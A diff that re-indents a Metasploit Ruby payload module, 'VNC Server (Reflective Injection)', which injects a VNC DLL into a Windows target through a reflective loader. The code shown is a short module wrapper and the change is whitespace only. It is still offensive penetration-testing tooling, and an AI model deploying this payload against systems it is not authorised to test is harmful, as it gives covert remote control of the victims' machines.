@@ -19,19 +19,19 @@ require 'msf/base/sessions/vncinject_options'
 ###
 module Metasploit3
 
-	include Msf::Payload::Windows::ReflectiveDllInject
-	include Msf::Sessions::VncInjectOptions
+  include Msf::Payload::Windows::ReflectiveDllInject
+  include Msf::Sessions::VncInjectOptions
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'          => 'VNC Server (Reflective Injection)',
-			'Description'   => 'Inject a VNC Dll via a reflective loader (staged)',
-			'Author'        => [ 'sf' ],
-			'Session'       => Msf::Sessions::VncInject ))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'VNC Server (Reflective Injection)',
+      'Description'   => 'Inject a VNC Dll via a reflective loader (staged)',
+      'Author'        => [ 'sf' ],
+      'Session'       => Msf::Sessions::VncInject ))
 
-	end
+  end
 
-	def library_path
-		File.join(Msf::Config.install_root, "data", "vncdll.dll")
-	end
+  def library_path
+    File.join(Msf::Config.install_root, "data", "vncdll.dll")
+  end
 end
